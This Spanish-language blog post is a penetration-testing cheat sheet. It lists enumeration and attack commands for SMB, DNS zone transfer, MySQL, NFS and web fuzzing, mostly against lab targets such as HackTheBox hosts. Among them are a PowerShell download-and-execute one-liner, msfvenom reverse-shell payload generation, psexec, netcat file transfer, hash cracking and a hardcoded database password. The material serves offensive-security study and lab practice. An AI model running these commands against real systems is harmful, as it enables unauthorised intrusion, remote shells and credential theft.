---
layout: post
title: Enumeración - CheetSheat
tags: [CheetSheat]
description: "Enumeración - CheetSheat"
---

* [Samba Port 445](#samba-port-445)
* [DNS 53](#dns-53)
* [MSQL 3306](#msql-3306)
* [HTTPS 443](#https-443)
* [SNMP UDP 161](#snmp-udp-161)
* [NFS 2049](#nfs-2049)
* [Transferencia de archivos](#transferencia-de-archivos)
  + [Linux](#linux)
  + [Windows](#windows)
* [Diccionarios](#diccionarios)
* [Nikto](#nikto)
* [Fuzzing Web](#fuzzing-web)
* [tshark](#tshark)


## Samba Port 445

### Iniciar samba

```
sudo service smbd start
```

### smbget

```
smbget -R smb://<share>/
```

### smbmap

```
smbmap -H <ip> -r /share/share2
smbmap -H <ip> --download /share/share2/file
smbmap -H <ip> -d <domain> -u <user> -p <password>
```

### smbclient

```
smbclient //<ip>/share -U <domain>\\<user>%<password>
smbclient -NL //<ip>
```

### psexec

```
psexec.py <domain>/<user>@<ip>
```

### CracMapExec

```
crackmapexec smb <ip>  -u <user> -p <password>
```

### Montura

```
mount -t cifs //<ip>/<share> <folder_attack> -o username=<user>,password=<password>,rw
umount <folder>
```

### Scripts nmap

```
nmap --script "vuln and safe" -p445 <ip>
nmap --script=smb-enum-shares,smb-enum-users -p445 <ip>
```

----

## DNS 53

| argumento | descripción                     |
|-----------|---------------------------------|
| ns        | nombres de servicio             |
| mx        | servidores de correo            |
| axfr      | ataque de transferencia de zona |

```
dig @<ip> <domain>
dig @<ip> <domain> ns
dig @<ip> <domain> mx
```

### Ataque de transferencia de zona

```
dig @<ip> <domain> axfr
```

-----------

## MSQL 3306

Ejecutar comandos en una misma linea

```
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e "show databases;
```

Conexión remota

```
mysql -u <user> -p<password> -h <host>
```

-----------

## HTTPS 443

```
openssl s_client --connect <ip>:<port>
```

## SNMP UDP 161

### Script de nmap

```
nmap --script snmp\* -p161 -sU <ip> -oN <output>
```

----

## NFS 2049

Es un sistema cliente / servidor que permite a los usuarios acceder a archivos a través de una red y tratarlos como si residieran en un directorio de archivos local.

### Carpeta desponible

```
showmount -e <ip>
```

### Montar carpeta

```
sudo mount -t nfs <ip>:<remote_folder> <local_folder>
```

----

## Transferencia de archivos

### Linux

```
nc -lvp <port> > file (recibe el fichero)
nc <ip> < <file> <port> (envia el fichero)
```

```
wget <url> -O <output>
```

```
impacket-smbserver share $(pwd) -smb2support
```

```
python3 -m http.server <port>
python -m SimpleHTTPServer <port>
```

```
sudo python -m pyftpdlip -p 21 -w
```

### Windows

```
certutil.exe -f -urlcache -split <url>
```

```
powershell IEX(New-Object Net.WebClient).downloadString('<url>')
```

-----------

## msfvenom

Linux

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
```

-----------

## Diccionarios

### Extensiones

```
> for i in $(locate extension | grep "word");do echo $(wc -l $i); done
/usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
```

### CGI

```
/usr/share/wordlist/SecLists/Discovery/Web-Content/CGIs.txt
```

### Web

```
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

### Subdominios

```
/usr/share/wordlists/SecLists/Discovery/DNS/
```

-----------

### Shellshock

```
ls -lah /usr/share/nmap/scripts/*shellshock*
nmap <ip> -p <port> --script=http-shellshock --script-args uri=/cgi-bin/<file>.cgi --script-args uri=/cgi-bin/<file2>.cgi
```

------------

## Nikto

```
nikto -host <ip>
```

------------

## Fuzzing Web

**Estado 401**  
indica que la petición (request) no ha sido ejecutada porque carece de credenciales válidas de autenticación para el recurso solicitado. Este estado se envia con un WWW-Authenticate encabezado que contiene informacion sobre como aut
rizar correctamente

**Estado 404**  
 Código de estado HTTP que indica que el host ha sido capaz de comunicarse con el servidor, pero no existe el recurso que ha sido pedido.

**Estado 301**  
Significa que una página se ha movido permanentemente a una nueva ubicación.

### wfuzz

| argumento | decripción |
|----|----|
| -c | formato colorizado |
| --hc | ocultar respuesta con código de estado |
| --sc | mostrar respuesta con el código de estado |
| --hh | ocultar respuesta por el numero de caracteres |
| -t   | numero de hilos |
| -z | payload |

```
wfuzz -c --hc=404 -w /usr/share/wordlists/dirb/common.txt http://192.168.0.101
wfuzz -c --sc=200 -w /usr/share/wordlists/dirb/common.txt http://192.168.0.101/FUZZ
wfuzz -z file,/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -c --basic FUZZ:FUZZ http://172.16.64.140/project
wfuzz -c -z range,1-100 -u http://10.10.10.245/data/FUZZ --hh=208
```

### dirsearch

| argumento | descripción |
|---|---|
| -u | url |
| -w | diccionario |
| -t | hilos |
| -e | extensiones |
| -f | forzar extensiones |
| -x | ocultar código de estado 403 |

```
dirsearch -u 192.168.0.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -e php,txt,html -f -x 403
```

### ffuf

| argumento | descripción |
|--|--|
| -b | cookies |
| -fc | ocultar código de estado |
| -mc | coincidir con código de estado |

```
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://monitors.htb/FUZZ -c -t 200 -mc 200,204,301,302,307,401,405,403
ffuf -w /usr/share/wordlists/dirb/big.txt -u "http://10.10.10.238/FUZZ" -c -t 200 -fc 403
fuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -u "http://localhost/dvwa/vulnerabilities/fi/?page=FUZZ" -b "security=low; PHPSESSID=9dpvhricbfl5aj58qses365ehk" -c -t 200 -fl=80
```

```
ffuf -w /usr&share/wordlist/Seclist/Discovery/DNS/subdomains-top1million-110000.txt -u "http://forge.htb" -H "Host:FUZZ.forge.htb" -t 200 fl 10
```

### GoBuster

| argumento | descripción |
|--|--|
| -q | no imprimir banner |
| -f | agregar una barra inclinada a cada solicitud de directorio |
| -x | extensiones |
| -t | hilos |
| -e | imprime URL completa |

```
gobuster dir -q -f -t 30 -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://192.168.0.103 -x php,html,txt
gobuster vhost -u "http://horizontall.htb/" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
```

### Dirb

| argumento | descripción |
|--|--|
| -X | extensiones |

```
dirb http://192.168.0.103 /usr/share/wordlists/dirb/big.txt -X .php
```

------------

## tshark

Consultas DNS

```
tshark -r pcap -Y "dns.flags.response==0"
```

Método GET o POST

```
tshark -r overpass2.pcapng -Y "http.request.method == GET or http.request.method == POST"
```

----

## Fuerza bruta

### hashcat

NTLM

```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```
